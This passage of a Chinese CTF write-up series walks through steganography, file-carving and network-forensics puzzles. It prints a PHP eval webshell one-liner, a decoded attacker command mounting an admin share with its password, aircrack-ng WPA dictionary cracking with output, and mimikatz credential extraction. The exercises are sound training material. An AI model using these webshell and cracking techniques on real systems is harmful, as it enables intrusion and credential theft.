(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 0)
(5, 4, 46) (5, 4, 1)
(5, 4, 46) (5, 4, 1)
(4, 3, 45) (4, 3, 0)
(4, 3, 45) (4, 3, 0)
(4, 3, 45) (4, 3, 0)
(4, 3, 45) (4, 3, 1)
(4, 3, 45) (4, 3, 0)
(4, 3, 45) (4, 3, 1)
(4, 3, 45) (4, 3, 1)
(4, 3, 45) (4, 3, 0)
(3, 2, 44) (3, 2, 0)
(3, 2, 44) (3, 2, 1)
(3, 2, 44) (3, 2, 1)
(3, 2, 44) (3, 2, 0)
(4, 3, 45) (4, 3, 0)
(4, 3, 45) (4, 3, 1)
(4, 3, 45) (4, 3, 1)
(4, 3, 45) (4, 3, 0)
(4, 3, 45) (4, 3, 0)
(4, 3, 45) (4, 3, 1)
(4, 3, 45) (4, 3, 1)
(4, 3, 45) (4, 3, 0)
(4, 3, 45) (4, 3, 0)
(4, 3, 45) (4, 3, 1)
(4, 3, 45) (4, 3, 1)
(4, 3, 45) (4, 3, 0)
(4, 3, 45) (4, 3, 0)
(4, 3, 45) (4, 3, 1)
(4, 3, 45) (4, 3, 0)
(4, 3, 45) (4, 3, 1)
(3, 2, 44) (3, 2, 0)
(3, 2, 44) (3, 2, 0)
(3, 2, 44) (3, 2, 1)
(3, 2, 44) (3, 2, 1)
(4, 1, 44) (4, 1, 0)
(4, 1, 44) (4, 1, 0)
(4, 1, 44) (4, 1, 1)
(4, 1, 44) (4, 1, 0)
(4, 1, 44) (4, 1, 0)
(4, 1, 44) (4, 1, 1)
(4, 1, 44) (4, 1, 1)
(4, 1, 44) (4, 1, 0)
(4, 1, 44) (4, 1, 0)
(4, 1, 44) (4, 1, 1)
(4, 1, 44) (4, 1, 0)
(4, 1, 44) (4, 1, 1)
(3, 2, 44) (3, 2, 0)
(3, 2, 44) (3, 2, 1)
(3, 2, 44) (3, 2, 1)
(3, 2, 44) (3, 2, 0)
(2, 1, 43) (2, 1, 1)
(2, 1, 43) (2, 1, 1)
(2, 1, 43) (2, 1, 1)
(2, 1, 43) (2, 1, 0)
(2, 1, 43) (2, 1, 0)
(2, 1, 43) (2, 1, 0)
(2, 1, 43) (2, 1, 1)
(2, 1, 43) (2, 1, 1)
(2, 1, 43) (2, 1, 0)
(2, 1, 43) (2, 1, 1)
(1, 0, 42) (1, 0, 1)
(1, 0, 42) (1, 0, 1)
(1, 0, 42) (1, 0, 0)
(1, 0, 42) (1, 0, 1)
(1, 0, 42) (1, 0, 1)
(1, 0, 42) (1, 0, 1)
(2, 1, 43) (2, 1, 1)
(2, 1, 43) (2, 1, 1)
(2, 1, 43) (2, 1, 0)
(2, 1, 43) (2, 1, 1)
```

发现前两位都一样，但最后一位存在差异，而且第二章图片的最后一位都是0或者1，猜想可能隐藏了数据

所以我们要把01段提取出来，8位一组，转为字符，得到字符串，应该就是flag

所以我们修改一下上面的脚本

```python
from PIL import Image
import binascii
import re

img1 = Image.open("1.png")
im1 = img1.load()
img2 = Image.open("2.png")
im2 = img2.load()

s=''

for x in range(img1.size[0]):
    for y in range(img1.size[1]):
        if(im1[x, y] != im2[x, y]):
            s = s + str(im2[x, y][2])

s = str.strip(re.sub(r'(\d{8})', r'\1 ', s))
a = ''.join([chr(i) for i in [int(b, 2) for b in s.split(' ')]])
lista = ''.join(a)
print lista
```

运行一下得到whale{w3_ar3_d1ffe2en7}

## Day 12

### 黑白打字机

**题干：**仔细看看图片，答案的格式是venusctf{xxxxx}，所以答案是

**相关知识：**

五笔输入法时中国、台湾、日本等利用结构字体书写的国家根据字体字根发明的一种输入法。我们将键盘上的按键映射到不同字体的字根，如横、竖等。最终只需要记忆每个字的字根病熟练练习就能比拼音输入法更快的输入汉字。而最正宗的五笔编码的86版的王码编码

**解题步骤：**

那道题目是一张被反色了的二维码图片，用画图工具进行反色，扫描二维码，得到：你会五笔吗

猜想应该要将这五个字编码为五笔，得到`wqiywfcugghgttfnkcg`

之后注意到文件名很可疑，倒过来读发现是steganography

所以我们要借助工具`image steganography`来帮助我们解密文件

直接解密发现解出来是一堆乱码，于是我们要用到decrypt功能，弹出一个password窗口，猜想刚才的五笔编码可能就是password

尝试输入，成功得到flag：venusctf{V3nus_St3gan0graph1_1s_g00d}

## Day 13

### 神龙的召唤

**题干：**一恒河沙中有三千世界，一张图里也可以有很多东西。答案是与一部动漫名字有关的小写英文字母。flag格式：venusctf{xxx}

**解题步骤：**

拿到题目是一张在杂志上经常看到的图片

binwalk跑一下，发现一个zip压缩包

foremost分离，得到压缩包，解压

得到一个rar的压缩文件

先用unrar试着打开，发现需要密码，一开始以为是伪加密或者爆破啥的，后来发现都不是

再次使用binwalk，又发现一张jpg图片

于是，再次使用foremost分离一下，得到一张倒过来的龙珠的图片

有根据题目提示，尝试输入venusctf{longzhu}，不对，后来又尝试了多种，加上图片给我们的提示

最终的flag是venusctf{llabnogard}，即dragon ball的反写

## Day 14

### A记录

**题干：**他在看什么视频，好像很好看，不知道是什么网站的。 还好我截取了他的数据包，找呀找。 key就是网站名称。格式ctf{key} tip:A记录的第一条。所以答案是

**相关知识：**

我们使用的无线网络非常不安全，因为谁都可以介入，所以我们使用了安全协议进行保护，从无限等效协议wep到wpa2，使用了rsa公司开发的rc4算法以及ase等加密方式对加入者的信息进行保护，并且也限制了只能知晓密钥的用户才能加入

**wifi协议：**

wifi限制了加入者，只有被主人给予权限的人才可以接入指定wifi，这也是我们的wifi利用加密方式做到的

wifi加密方式：

* wep加密：已经过时，非常不安全，加密也是白加
* wpa／wpa2-psk加密：wpa是wep的过渡方案，wpa2优化了wpa更为安全的算法

**解题步骤：**

用wireshark打开，发现被加了密

使用`aircrack-ng`进行破解，扔进kali

```
root@kali:~/Desktop# aircrack-ng shipin.cap
Opening shipin.cap
Read 16664 packets.

   #  BSSID              ESSID                     Encryption

   1  00:1D:0F:5D:D0:EE  0719                      WPA (1 handshake)

Choosing first network as target.

Opening shipin.cap
Please specify a dictionary (option -w).


Quitting aircrack-ng...
```

发现是wpa加密，用字典爆破一下

```
root@kali:~/Desktop# aircrack-ng shipin.cap -w password.txt 
Opening shipin.cap
Read 16664 packets.

   #  BSSID              ESSID                     Encryption

   1  00:1D:0F:5D:D0:EE  0719                      WPA (1 handshake)

Choosing first network as target.

Opening shipin.cap
Reading packets, please wait...

                                 Aircrack-ng 1.2 rc3


                   [00:00:00] 8 keys tested (486.23 k/s)


                           KEY FOUND! [ 88888888 ]


      Master Key     : B4 30 38 0F 24 7B 57 AC DE B5 3A 7F 2E FE 6B 45 
                       0B 34 02 C3 89 F9 69 D5 B7 35 87 1B FB 4C EE 7F 

      Transient Key  : 17 AE 23 D0 69 7C 0D 45 2B 40 F6 7D 06 C9 C5 6F 
                       25 F0 B0 48 7A 6C 22 7C E2 73 50 71 46 FE 5D 0C 
                       8F 59 01 BE 66 56 DF 1E 58 DD 34 DB BF A7 2D FD 
                       2C 53 11 7F B2 E5 F0 16 7F 57 F5 6A 04 36 F5 71 

      EAPOL HMAC     : 75 19 C5 F3 3E 33 58 23 CA 4B A1 85 FB 46 C0 2A 
```

密码是88888888

再使用`airdecap-ng`破解

```
root@kali:~/Desktop# airdecap-ng shipin.cap -e 0719 -p 88888888
Total number of packets read         16664
Total number of WEP data packets         0
Total number of WPA data packets        27
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets        16
```

发现多了一个`shipin-dec.cap`

再用wireshark打开，在过滤器中输入dns

第一个A记录是`google.com`，但并不是答案，因为它不是视频网站

所以第二个才是我们所要的，域名是：`push.m.youku.com`

所以flag是ctf{push.m.youku.com}

## Day 15

### 黑客攻击

**题干：**这是捕获的黑客攻击数据包，答案是Administrator的密码。答案的格式是flag{xxxxx}，所以答案是

**相关知识：**

中国菜刀是管理员管理网站的利器，却也是黑客用来搭配一句话木马渗透网站的利器。菜刀非常短小精悍，仅仅只有几M的身躯却可以完成文件管理、数据库管理、虚拟终端执行系统命令等操作，而且新版的中国菜刀利用各种编码方式还能够绕过各类waf和安全机制的检查

**解题步骤:**

打开压缩包是一个pcap的数据包，用wireshark打开

因为是黑客攻击，应该是http协议，所以在过滤器中输入http进行过滤

我们发现访问的域名基本都是config.php，这应该是一句话木马组合菜刀进行渗透测试，在config.php中加入了一句话木马

```
yo=@eval(base64_decode($_POST[z0]));
```

菜刀是通过base64编码对命令进行传输，随便点开一个config.php，打开http数据段，就能看到很多参数，我们将POST里面参数的值进行解密就能获取命令

所以我们就一条一条的解码，直到找到我们可能需要的

这里要说明一个问题，题目在这里出现了一个bug，可以直接获取到password

我们点击编号为449的数据，z2的值为
```
Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJm5ldCB1c2UgXFwxOTIuMTY4LjMwLjE4NFxDJCAiVGVzdCFAIzEyMyIgL3U6QWRtaW5pc3RyYXRvciZlY2hvIFtTXSZjZCZlY2hvIFtFXQ==
```

解码得到

```
cd /d "c:\inetpub\wwwroot\"&net use \\192.168.30.184\C$ "Test!@#123" /u:Administrator&echo [S]&cd&echo [E]
```

我们发现它是利用管理员身份去登录的，而`Test!@#123`即为管理员的密码，其实这里我们的flag就出现了，当然题目的本意并不是这样的

在编号为10054的地方，我们看到一个rar文件生成的进度条，怀疑应该是生成了一个rar文件，猜测后面应该会有文件下载的数据

接着往下找，在编号为17729的地方看到数据特别大，怀疑是个文件下载，并且我们也看到了一个rar的数据包，验证上面我们的猜测

我们选中最后一行的`Line-based text data`，右键导出分组字节流，但要注意我们要把导出文件用16进制编辑器打开，删去开头处的`->|`和结尾处的`|<-`，保存

尝试去解压，发现需要密码，于是我们回到上面编号为10054的地方，查看文件生成的地方，应该会有我们想要的密码

于是我们点击编号9997，去查看生成文件的命令

```
cd /d "c:\inetpub\wwwroot\"&C:\progra~1\WinRAR\rar a C:\Inetpub\wwwroot\backup\wwwroot.rar C:\Inetpub\wwwroot\backup\1.gif -hpJJBoom&echo [S]&cd&echo [E]
```

百度一下winrar的命令行参数，发现`-hp`就是密码，那么密码我们就得到了，`JJBoom`

输入，成功解压，得到一个1.gif的文件，无法打开，用16进制编辑器打开，发现是一个dump文件，我们将文件名后缀改为dmp

接着我们用神器mimikatz提取密码

![](https://ws1.sinaimg.cn/large/006Vib6xgy1fosl83r6wqj30n00neq4z.jpg)

我们很清楚的看到，密码就是Test!@#123

所以flag就是flag{Test!@#123}

## Day 16

### 好多苍蝇

**题干：**好多苍蝇啊，吧我的重要文件都爬满了，看不到怎么办？提交格式是flag{xxxx},所以答案是？

**相关知识：**

当我们利用网络发送文件或者数据信息时，经常会遇到文件总体大小比TPC一次连接可发送的数据大的情况。TCP为了防止分片发送的数据丢失，会将文件按照合适的大小分片后加入队列，然后利用窗口移动的原理依次向目标发送数据

**解题步骤：**

是一个pcapng包，用wireshark打开

使用统计功能，发现很多都是`mail.qq`这样的域名，猜测是发邮件，由上述知识可知，这题应该是发送一个较大的附件，分组发送

这里首要关注http的post请求

首先我们看到第一个post请求，在`HTML Form URL Encoded`中看到

```
{"path":"fly.rar","appid":"","size":525701,"md5":"e023afa4f6579db5becda8fe7861c2d3","sha":"ecccba7aea1d482684374b22e2e7abad2ba86749","sha3":""}
```

看到一个fly.rar的文件，还有文件的哈希值

往下找，找到连续五个带有这个md5值的post请求，编号分别为163、289、431、577、729，并且我们在编号为163的数据中看到了rar头，猜想应该是这五个文件组成了最终的fly.rar文件

选择`文件->导出对象->http`，将上述五个编号的文件导出，用16进制编辑器打开

发现第一个文件rar标志为前面有一串数据，长度为364，打开其他文件，发现其他文件前面也有相同的一段，猜测应该是验证什么的，并不是rar文件的数据，所以我们将前面的部分删除，再将五个文件的数据拼接在一起，生成完整的fly.rar

解压，需要密码，并且显示flag.txt头错误，我们去计算一下这个文件的哈希值，发现跟上面的md5值和sha1值相等，说明文件是没有问题的，应该是个伪加密，将第24位的84改为80，即可解决

修改之后，成功解压得到flag.txt，用notepad++打开发现是乱码，应该不是个txt文件，扔到binwalk里看一下，发现有很多东西，png图片啊什么的，而最开头是windows的一个可执行文件，不管他，直接foremost

分解出来很多png图片，全是苍蝇的图片，在最后看到一张二维码，扫描，得到flag{m1Sc_oxO2_Fly}
